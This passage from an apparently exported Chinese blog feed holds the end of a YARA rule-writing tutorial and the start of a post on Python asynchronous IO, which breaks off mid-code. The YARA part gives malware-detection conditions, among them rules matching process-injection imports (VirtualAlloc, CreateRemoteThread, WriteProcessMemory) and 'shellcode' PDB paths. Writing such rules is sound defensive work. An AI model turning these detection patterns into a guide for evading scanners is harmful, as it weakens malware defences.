<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rule AtExample</span><br><span class="line">&#123;</span><br><span class="line">    strings:</span><br><span class="line">        <span class="variable">$a</span> = <span class="string">"dummy1"</span></span><br><span class="line">        <span class="variable">$b</span> = <span class="string">"dummy2"</span></span><br><span class="line">    condition:</span><br><span class="line">        @a[3] == 100 </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="匹配长度"><a href="#匹配长度" class="headerlink" title="匹配长度"></a>匹配长度</h3><p>这个主要用于正则表达式，比如 <code>/fo*/</code>可以匹配字符串 ‘fo’, ‘foo’,’fooo’等，但是具体要选择哪一个呢？这里可以用!来去匹配长度：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rule MatchLength&#123;</span><br><span class="line">	strings:</span><br><span class="line">    <span class="variable">$a</span> = /fo*/</span><br><span class="line">	condition:</span><br><span class="line">  	!a[1] == 4 // 匹配 fooo</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="访问指定位置的数据"><a href="#访问指定位置的数据" class="headerlink" title="访问指定位置的数据"></a>访问指定位置的数据</h3><p>使用以下函数从给定偏移量的文件中读取数据：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">int8(&lt;offset or virtual address&gt;)</span><br><span class="line">int16(&lt;offset or virtual address&gt;)</span><br><span class="line">int32(&lt;offset or virtual address&gt;)</span><br><span class="line">uint8(&lt;offset or virtual address&gt;)</span><br><span class="line">uint16(&lt;offset or virtual address&gt;)</span><br><span class="line">uint32(&lt;offset or virtual address&gt;)</span><br><span class="line">int8be(&lt;offset or virtual address&gt;)</span><br><span class="line">int16be(&lt;offset or virtual address&gt;)</span><br><span class="line">int32be(&lt;offset or virtual address&gt;)</span><br><span class="line">uint8be(&lt;offset or virtual address&gt;)</span><br><span class="line">uint16be(&lt;offset or virtual address&gt;)</span><br><span class="line">uint32be(&lt;offset or virtual address&gt;)</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rule IsPE</span><br><span class="line">&#123;</span><br><span class="line">    condition:</span><br><span class="line">        // MZ signature at offset 0 and ...</span><br><span class="line">        uint16(0) == 0x5A4D and</span><br><span class="line">        // ... PE signature at offset stored <span class="keyword">in</span> MZ header at 0x3C</span><br><span class="line">        uint32(uint32(0x3C)) == 0x00004550</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="字符串集合"><a href="#字符串集合" class="headerlink" title="字符串集合"></a>字符串集合</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">2 of (<span class="variable">$a</span>,<span class="variable">$b</span>,<span class="variable">$c</span>)</span><br><span class="line">all of them       // all strings <span class="keyword">in</span> the rule</span><br><span class="line">any of them       // any string <span class="keyword">in</span> the rule</span><br><span class="line">all of (<span class="variable">$a</span>*)      // all strings whose identifier starts by <span class="variable">$a</span></span><br><span class="line">any of (<span class="variable">$a</span>,<span class="variable">$b</span>,<span class="variable">$c</span>) // any of <span class="variable">$a</span>, <span class="variable">$b</span> or <span class="variable">$c</span></span><br><span class="line">1 of ($*)         // same that <span class="string">"any of them"</span></span><br><span class="line">none of (<span class="variable">$b</span>*)     // zero of the <span class="built_in">set</span> of strings that start with <span class="string">"<span class="variable">$b</span>"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">all of (<span class="variable">$a</span>*) <span class="keyword">in</span> (filesize-500..filesize)</span><br><span class="line">any of (<span class="variable">$a</span>*, <span class="variable">$b</span>*) <span class="keyword">in</span> (1000..2000)</span><br></pre></td></tr></table></figure>
<h3 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h3><h4 id="对多个字符串使用相同的条件"><a href="#对多个字符串使用相同的条件" class="headerlink" title="对多个字符串使用相同的条件"></a>对多个字符串使用相同的条件</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> expression of string_set : ( boolean_expression )</span><br><span class="line"></span><br><span class="line">在集合string_set中，expression必须满足( boolean_expression )</span><br><span class="line"></span><br><span class="line">例如：</span><br><span class="line"><span class="keyword">for</span> any of (<span class="variable">$a</span>,<span class="variable">$b</span>,<span class="variable">$c</span>) : ( $ at pe.entry_point )</span><br><span class="line">布尔表达式中的 $ 符号不与任何特定字符串相关联，它将是 <span class="variable">$a</span>，然后是 <span class="variable">$b</span>，最后是 <span class="variable">$c</span></span><br></pre></td></tr></table></figure>
<p>其实这里可以发现any of 是一种简写:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">any of (<span class="variable">$a</span>,<span class="variable">$b</span>,<span class="variable">$c</span>)</span><br><span class="line">等价于</span><br><span class="line"><span class="keyword">for</span> any of (<span class="variable">$a</span>,<span class="variable">$b</span>,<span class="variable">$c</span>) : ( $ )</span><br></pre></td></tr></table></figure>
<p>在 expression 中也可以使用 @, # ,! 等运算符：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> all of them : ( <span class="comment"># &gt; 3 )</span></span><br><span class="line"><span class="keyword">for</span> all of (<span class="variable">$a</span>*) : ( @ &gt; @b )</span><br></pre></td></tr></table></figure>
<h4 id="迭代字符串"><a href="#迭代字符串" class="headerlink" title="迭代字符串"></a>迭代字符串</h4><p>可以使用以下语法访问给定字符串出现在文件或进程地址空间中的偏移量或虚拟地址：@a[i]，其中 i 是一个索引，指示出现了你所指的字符串 $a 。（@a[1]、@a[2]、…）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rule Occurrences</span><br><span class="line">&#123;</span><br><span class="line">    strings:</span><br><span class="line">        <span class="variable">$a</span> = <span class="string">"dummy1"</span></span><br><span class="line">        <span class="variable">$b</span> = <span class="string">"dummy2"</span></span><br><span class="line">    condition:</span><br><span class="line">        <span class="keyword">for</span> all i <span class="keyword">in</span> (1,2,3) : ( @a[i] + 10 == @b[i] )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>以上条件也可以写成：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> all i <span class="keyword">in</span> (1..3) : ( @a[i] + 10 == @b[i]</span><br></pre></td></tr></table></figure>
<p>另一个规则：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> all i <span class="keyword">in</span> (1..<span class="comment">#a) : ( @a[i] &lt; 100 )   //#a 代表 $a 出现的次数</span></span><br></pre></td></tr></table></figure>
<p>还有可以限定满足条件的迭代次数：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> 2 i <span class="keyword">in</span> (1..<span class="comment">#a) : ( @a[i] &lt; 100 )</span></span><br></pre></td></tr></table></figure>
<h4 id="迭代器"><a href="#迭代器" class="headerlink" title="迭代器"></a>迭代器</h4><p>在 YARA 4.0 中，for..of运算符得到了改进，现在它不仅可以用于迭代整数枚举和范围（例如：1,2,3,4 和 1..4），还可以用于任何类型的可迭代数据类型，例如YARA 模块定义的数组和字典。例如，以下表达式在 YARA 4.0 中有效：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> any section <span class="keyword">in</span> pe.sections : ( section.name == <span class="string">".text"</span>）</span><br><span class="line"></span><br><span class="line">// 等价于</span><br><span class="line"><span class="keyword">for</span> any i <span class="keyword">in</span> (0..pe.number_of_sections-1) : ( pe.sections[i].name == <span class="string">".text"</span> )</span><br></pre></td></tr></table></figure>
<p>在迭代字典时，您必须提供两个变量名，它们将保存字典中每个条目的键和值，例如：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> any k,v <span class="keyword">in</span> some_dict : ( k == <span class="string">"foo"</span> and v == <span class="string">"bar"</span> )</span><br></pre></td></tr></table></figure>
<h3 id="外部变量"><a href="#外部变量" class="headerlink" title="外部变量"></a>外部变量</h3><p>外部变量允许您定义依赖于外部提供的值的规则。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rule ExternalVariableExample1</span><br><span class="line">&#123;</span><br><span class="line">    condition:</span><br><span class="line">        ext_var == 10</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在这种情况下ext_var是一个外部变量，其值在运行时分配。外部变量可以是以下类型：整数、字符串或布尔值；它们的类型取决于分配给它们的值。整数变量可以替代条件中的任何整数常量，布尔变量可以占据布尔表达式的位置。例如：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rule ExternalVariableExample2</span><br><span class="line">&#123;</span><br><span class="line">    condition:</span><br><span class="line">        bool_ext_var or filesize &lt; int_ext_var</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>string类型的外部变量可以与以下运算符一起使用：contains、startswith、endswith及其不区分大小写的对应运算符：icontains、istartswith和iendswith`。它们还可以与“matches运算符一起使用，如果字符串与给定的正则表达式匹配，则返回true。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rule ContainsExample</span><br><span class="line">&#123;</span><br><span class="line">    condition:</span><br><span class="line">        string_ext_var contains <span class="string">"text"</span></span><br><span class="line">&#125;</span><br><span class="line">rule CaseInsensitiveContainsExample</span><br><span class="line">&#123;</span><br><span class="line">    condition:</span><br><span class="line">        string_ext_var icontains <span class="string">"text"</span></span><br><span class="line">&#125;</span><br><span class="line">rule StartsWithExample</span><br><span class="line">&#123;</span><br><span class="line">    condition:</span><br><span class="line">        string_ext_var startswith <span class="string">"prefix"</span></span><br><span class="line">&#125;</span><br><span class="line">rule EndsWithExample</span><br><span class="line">&#123;</span><br><span class="line">    condition:</span><br><span class="line">        string_ext_var endswith <span class="string">"suffix"</span></span><br><span class="line">&#125;</span><br><span class="line">rule MatchesExample</span><br><span class="line">&#123;</span><br><span class="line">    condition:</span><br><span class="line">        string_ext_var matches /[a-z]+/is</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="偏门模块"><a href="#偏门模块" class="headerlink" title="偏门模块"></a>偏门模块</h2><ol>
<li>Hash模块</li>
</ol>
<p><a href="https://yara.readthedocs.io/en/latest/modules/hash.html" target="_blank" rel="noopener">https://yara.readthedocs.io/en/latest/modules/hash.html</a></p>
<ol start="2">
<li>Math模块</li>
</ol>
<p><a href="https://yara.readthedocs.io/en/latest/modules/math.html" target="_blank" rel="noopener">https://yara.readthedocs.io/en/latest/modules/math.html</a></p>
<ol start="3">
<li>Dotnet 模块</li>
</ol>
<p><a href="https://yara.readthedocs.io/en/latest/modules/dotnet.html" target="_blank" rel="noopener">https://yara.readthedocs.io/en/latest/modules/dotnet.html</a></p>
<h2 id="一些进阶用法"><a href="#一些进阶用法" class="headerlink" title="一些进阶用法"></a>一些进阶用法</h2><h3 id="打分"><a href="#打分" class="headerlink" title="打分"></a>打分</h3><p>利用yara的math模块进行打分</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">math.to_number(SubRule1) * 60 + math.to_number(SubRule2) * 20 + math.to_number(SubRule3) * 70 &gt; 80</span><br></pre></td></tr></table></figure>
<h3 id="判断-text-section的墒值在7-4与7-6之间"><a href="#判断-text-section的墒值在7-4与7-6之间" class="headerlink" title="判断.text section的墒值在7.4与7.6之间"></a>判断.text section的墒值在7.4与7.6之间</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> any section <span class="keyword">in</span> pe.sections : ( </span><br><span class="line">section.name == <span class="string">".text"</span> </span><br><span class="line">and  math.in_range(math.entropy(section.raw_data_offset,section.raw_data_size),7.4,7.6))</span><br></pre></td></tr></table></figure>
<h3 id="导入表有且仅有VirtualAlloc-和-CreateRemoteThread-以及-WriteProcessMemory"><a href="#导入表有且仅有VirtualAlloc-和-CreateRemoteThread-以及-WriteProcessMemory" class="headerlink" title="导入表有且仅有VirtualAlloc 和 CreateRemoteThread 以及 _WriteProcessMemory_"></a>导入表有且仅有<code>VirtualAlloc</code> 和 <code>CreateRemoteThread</code> 以及 <code>_WriteProcessMemory_</code></h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pe.imports(<span class="string">"kernel32.dll"</span>,<span class="string">"VirtualAlloc"</span>) </span><br><span class="line">and </span><br><span class="line">pe.imports(<span class="string">"kernel32.dll"</span>,<span class="string">"CreateRemoteThread"</span>) </span><br><span class="line">and </span><br><span class="line">pe.imports(<span class="string">"kernel32.dll"</span>,<span class="string">"WriteProcessMemory"</span>) </span><br><span class="line">and </span><br><span class="line">pe.imports(<span class="string">"kernel32.dll"</span>)  == 3</span><br></pre></td></tr></table></figure>
<h3 id="有某个图标，并且无签名-不够灵活，没法设定一个hash列表"><a href="#有某个图标，并且无签名-不够灵活，没法设定一个hash列表" class="headerlink" title="有某个图标，并且无签名(不够灵活，没法设定一个hash列表)"></a>有某个图标，并且无签名(不够灵活，没法设定一个hash列表)</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import <span class="string">"hash"</span></span><br><span class="line">import <span class="string">"pe"</span></span><br><span class="line"></span><br><span class="line">rule iconForge&#123;</span><br><span class="line"></span><br><span class="line">   condition:</span><br><span class="line">    	<span class="keyword">for</span> any res <span class="keyword">in</span> pe.resources: (</span><br><span class="line">          res.type == pe.RESOURCE_TYPE_ICON</span><br><span class="line">            hash.md5( res.offset,res.length) == <span class="string">"xxxxx"</span></span><br><span class="line">            ) </span><br><span class="line">        and </span><br><span class="line">            pe.number_of_signatures == 0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="匹配PDB路径"><a href="#匹配PDB路径" class="headerlink" title="匹配PDB路径"></a>匹配PDB路径</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pe.pdb_path icontains <span class="string">"shellcode"</span> or pe.pdb icontains <span class="string">"qianxin"</span></span><br></pre></td></tr></table></figure>
<h3 id="匹配特征在具体的节区"><a href="#匹配特征在具体的节区" class="headerlink" title="匹配特征在具体的节区"></a>匹配特征在具体的节区</h3><figure class="highlight roboconf"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> "pe"</span><br><span class="line"><span class="keyword">import</span> "console"</span><br><span class="line"></span><br><span class="line">rule test&#123;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">strings</span>:</span><br><span class="line">        $a = &#123;55 8B EC F6 45 08 01 56 8B F1 C7 06 94 1F 43 00&#125;</span><br><span class="line"></span><br><span class="line">    condition:</span><br><span class="line">        $a in (</span><br><span class="line">            pe<span class="variable">.sections</span>[ pe<span class="variable">.section_index</span>("<span class="variable">.text</span>") ]<span class="variable">.raw_data_offset</span>.<span class="variable">.pe</span><span class="variable">.sections</span>[ pe<span class="variable">.section_index</span>("<span class="variable">.text</span>") ]<span class="variable">.raw_data_offset</span>+pe<span class="variable">.sections</span>[ pe<span class="variable">.section_index</span>("<span class="variable">.text</span>") ]<span class="variable">.raw_data_size</span></span><br><span class="line">        )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>binary</tag>
        <tag>blue &amp; red</tag>
      </tags>
  </entry>
  <entry>
    <title>一步步理解python的异步IO</title>
    <url>/2018/06/25/%E4%B8%80%E6%AD%A5%E6%AD%A5%E7%90%86%E8%A7%A3python%E7%9A%84%E5%BC%82%E6%AD%A5IO/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>看到越来越多的大佬都在使用python的异步IO，协程等概念来实现高效的IO处理过程，可是我对这些概念还不太懂，就学习了一下。 因为是初学者，在理解上有很多不到位的地方，如果有错误，还希望能够有人积极帮我斧正。</p>
<p>下面就使用一个简单的爬虫的例子，通过一步一步的改进，最后来用异步IO的方式实现。</p>
<a id="more"></a>

<h3 id="0x01-阻塞的IO"><a href="#0x01-阻塞的IO" class="headerlink" title="0x01 阻塞的IO"></a>0x01 阻塞的IO</h3><p>我们要实现一个爬虫，去爬百度首页n次，最简单的想法就是依次下载，从建立socket连接到发送网络请求再到读取响应数据，顺序进行。</p>
<p>代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8 </span></span><br><span class="line"><span class="keyword">import</span> time </span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">doRequest</span><span class="params">()</span>:</span></span><br><span class="line">    sock = socket.socket()</span><br><span class="line">    sock.connect((<span class="string">'www.baidu.com'</span>,<span class="number">80</span>))</span><br><span class="line">    sock.send(<span class="string">"GET / HTTP/1.1\r\nHost: www.baidu.com\r\nConnection: Close\r\n\r\n"</span>.encode(<span class="string">"utf-8"</span>))</span><br><span class="line">    response = sock.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    start = time.time()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(int(sys.argv[<span class="number">1</span>])):</span><br><span class="line">        doRequest()</span><br><span class="line">    print(<span class="string">"spend time : %s"</span> %(time.time()-start))</span><br><span class="line">    </span><br><span class="line">main()</span><br></pre></td></tr></table></figure>

<p>因为socket是阻塞方式调用的，所以cpu执行到<code>sock.connect()</code>,<code>sock.recv()</code>,就会一直卡在那里直到socket的状态就绪，所以浪费了很多的CPU时间。</p>
<p>请求10次和20次的时间分别如下所示：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">➜</span> <span class="string">python3</span> <span class="number">1.</span><span class="string">py</span>  <span class="number">10</span></span><br><span class="line"><span class="attr">spend time :</span> <span class="number">0.9282660484313965</span></span><br><span class="line"><span class="string">➜</span> <span class="string">python3</span> <span class="number">1.</span><span class="string">py</span>  <span class="number">20</span></span><br><span class="line"><span class="attr">spend time :</span> <span class="number">1.732438087463379</span></span><br></pre></td></tr></table></figure>

<p>可以看到，速度慢的跟蜗牛一样。</p>
<h3 id="0x02-改进1-并发"><a href="#0x02-改进1-并发" class="headerlink" title="0x02 改进1-并发"></a>0x02 改进1-并发</h3><p>为了加快请求的速度，很容易想到我们可以使用并发的方式进行，那么最好的方式就是使用多线程了。修改后的代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8 </span></span><br><span class="line"><span class="comment"># 多线程</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> time </span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> threading </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">doRequest</span><span class="params">()</span>:</span></span><br><span class="line">    sock = socket.socket()</span><br><span class="line">    sock.connect((<span class="string">'www.baidu.com'</span>,<span class="number">80</span>))</span><br><span class="line">    sock.send(<span class="string">"GET / HTTP/1.1\r\nHost: www.baidu.com\r\nConnection: Close\r\n\r\n"</span>.encode(<span class="string">"utf-8"</span>))</span><br><span class="line">    response = sock.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    start = time.time()</span><br><span class="line">    threads = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(int(sys.argv[<span class="number">1</span>])):</span><br><span class="line">        <span class="comment"># doRequest()</span></span><br><span class="line">        threads.append(threading.Thread(target=doRequest,args=()))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> threads:</span><br><span class="line">        i.start()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> threads:</span><br><span class="line">        i.join()</span><br><span class="line">    print(<span class="string">"spend time : %s"</span> %(time.time()-start))</span><br><span class="line">main()</span><br></pre></td></tr></table></figure>

<p>使用线程之后，看一下请求10次和20次的时间：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">➜  python3 <span class="number">2.</span>py  <span class="number">10</span></span><br><span class="line">spend time : <span class="number">0.1124269962310791</span></span><br><span class="line">➜ python3 <span class="number">2.</span>py  <span class="number">20</span></span><br><span class="line">spend time : <span class="number">0.15438294410705566</span></span><br></pre></td></tr></table></figure>

<p>速度明显快了很多，几乎是刚才的10倍了。</p>
<p>但是python的线程是有问题的，因为一个python进程中，同一时刻只允许一个线程运行，正在执行的线程会获取到GPL。做阻塞的系统调用时，例如<code>sock.connect()</code>,<code>sock.recv()</code>时，当前线程会释放GIL，让别的线程有机会获取GPL，然后执行。但是这种获取GPL的调度策略是抢占式的，以保证同等优先级的线程都有均等的执行机会，那带来的问题是：并不知道下一时刻是哪个线程被运行，也不知道它正要执行的代码是什么。所以就可能存在<strong>竞态条件</strong>。这种竞争有可能使某些线程处于劣势，导致一直获取不到GIL</p>
<p>比如如下的情况，线程1执行的代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flag = <span class="literal">True</span></span><br><span class="line"><span class="keyword">while</span> flag:</span><br><span class="line">    <span class="keyword">pass</span>  <span class="comment"># 啥也不干</span></span><br></pre></td></tr></table></figure>

<p>比如如下的情况，线程2执行的代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flag = <span class="literal">True</span></span><br><span class="line"><span class="keyword">while</span> flag:</span><br><span class="line">    .....  <span class="comment"># 这里省略一些复杂的操作,会调用多次IO操作</span></span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>可以看到，线程1的任务非常简单，而线程2的任务非常复杂，这就会导致CPU不停地去执行线程1，而真正做实际工作的线程2却很少被调度到，导致了浪费了大量的CPU资源。</p>
<h3 id="0x03-改进2-非阻塞方式"><a href="#0x03-改进2-非阻塞方式" class="headerlink" title="0x03 改进2-非阻塞方式"></a>0x03 改进2-非阻塞方式</h3><p>在第一个例子中，我们意识到浪费了大量的时间，是因为我们用了阻塞的IO，导致CPU在卡在那里等待IO的就绪，那使用非阻塞的IO，是不是就可以解决这个问题了。</p>
<p>代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8 </span></span><br><span class="line"><span class="keyword">import</span> time </span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">doRequest</span><span class="params">()</span>:</span></span><br><span class="line">    sock = socket.socket()</span><br><span class="line">    sock.setblocking(<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sock.connect((<span class="string">'www.baidu.com'</span>,<span class="number">80</span>))</span><br><span class="line">    <span class="keyword">except</span> BlockingIOError:</span><br><span class="line">        <span class="keyword">pass</span>    </span><br><span class="line"></span><br><span class="line">    <span class="comment"># 因为设置为非阻塞模式了，不知道何时socket就绪，需要不停的监控socket的状态</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            sock.send(<span class="string">"GET / HTTP/1.1\r\nHost: www.baidu.com\r\nConnection: Close\r\n\r\n"</span>.encode(<span class="string">"utf-8"</span>))</span><br><span class="line">            <span class="comment"># 直到send 不抛出异常，就发送成功了 </span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> OSError:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = sock.recv(<span class="number">1024</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> OSError:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    start = time.time()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(int(sys.argv[<span class="number">1</span>])):</span><br><span class="line">        doRequest()</span><br><span class="line">    print(<span class="string">"spend time : %s"</span> %(time.time()-start))</span><br><span class="line">    </span><br><span class="line">main()</span><br></pre></td></tr></table></figure>

<p><code>sock.setblocking(False)</code>把socket设置为非阻塞式的，也就是说执行完<code>sock.connect()</code>和<code>sock.recv()</code>之后，CPU不再等待IO了，会继续往下执行，来看一下执行时间：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">➜</span>  <span class="string">python3</span> <span class="number">3.</span><span class="string">py</span>  <span class="number">10</span></span><br><span class="line"><span class="attr">spend time :</span> <span class="number">1.0597507953643799</span></span><br><span class="line"><span class="string">➜</span>  <span class="string">python3</span> <span class="number">3.</span><span class="string">py</span>  <span class="number">20</span></span><br><span class="line"><span class="attr">spend time :</span> <span class="number">2.0327329635620117</span></span><br></pre></td></tr></table></figure>

<p>感觉被骗了，速度还是跟第一个一样啊，看来非阻塞IO并没有什么速度上的提升啊，问题出在哪里呢？看代码发现多了两个while循环：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sock.send(<span class="string">"GET / HTTP/1.1\r\nHost: www.baidu.com\r\nConnection: Close\r\n\r\n"</span>.encode(<span class="string">"utf-8"</span>))</span><br><span class="line">        <span class="comment"># 直到send 不抛出异常，就发送成功了 </span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span> OSError:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = sock.recv(<span class="number">1024</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span> OSError:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<p>因为把socket设置为非阻塞模式了，所以CPU并不知道IO什么时候就绪，所以必须在这里不停的尝试，直到IO可以使用了为止。</p>
<p><strong>虽然 connect() 和 recv() 不再阻塞主程序，空出来的时间段CPU没有空闲着，但并没有利用好这空闲去做其他有意义的事情，而是在循环尝试读写 socket （不停判断非阻塞调用的状态是否就绪）。</strong></p>
<p>有没有办法让CPU空闲出来的时间，不用来不停的询问IO，而是干别的更有意义的事情呢，等IO就绪后再通知CPU回来处理呢？当然有了，那就是回调。</p>
<h3 id="0x04-改进3-回调"><a href="#0x04-改进3-回调" class="headerlink" title="0x04 改进3-回调"></a>0x04 改进3-回调</h3><p>操作系统已经把IO状态的改变封装成了事件，如可读事件、可写事件。并且可以为这些事件绑定处理函数。所以我们可以使用这种方式，为socket的IO状态的变化绑定处理函数，交给系统进行调动，这样就是回调方式。python的select模块支持这样的操作。</p>
<p>代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> selectors <span class="keyword">import</span> DefaultSelector, EVENT_WRITE, EVENT_READ</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">selector = DefaultSelector()</span><br><span class="line">stopped = <span class="literal">False</span></span><br><span class="line">urls_todo = []</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Crawler</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, url)</span>:</span></span><br><span class="line">        self.url = url</span><br><span class="line">        self.sock = <span class="literal">None</span></span><br><span class="line">        self.response = <span class="string">b''</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fetch</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.sock = socket.socket()</span><br><span class="line">        self.sock.setblocking(<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            self.sock.connect((<span class="string">'www.baidu.com'</span>, <span class="number">80</span>))</span><br><span class="line">        <span class="keyword">except</span> BlockingIOError:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        selector.register(self.sock.fileno(), EVENT_WRITE, self.connected)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">connected</span><span class="params">(self, key, mask)</span>:</span></span><br><span class="line">        selector.unregister(key.fd)</span><br><span class="line">        get = <span class="string">'GET &#123;0&#125; HTTP/1.0\r\nHost: www.baidu.com\r\n\r\n'</span>.format(self.url)</span><br><span class="line">        self.sock.send(get.encode(<span class="string">'ascii'</span>))</span><br><span class="line">        selector.register(key.fd, EVENT_READ, self.read_response)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">read_response</span><span class="params">(self, key, mask)</span>:</span></span><br><span class="line">        <span class="keyword">global</span> stopped</span><br><span class="line">        <span class="comment"># 如果响应大于4KB，下一次循环会继续读</span></span><br><span class="line">        chunk = self.sock.recv(<span class="number">4096</span>)</span><br><span class="line">        <span class="keyword">if</span> chunk:</span><br><span class="line">            self.response += chunk</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            selector.unregister(key.fd)</span><br><span class="line">            urls_todo.remove(self.url)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> urls_todo:</span><br><span class="line">                stopped = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span 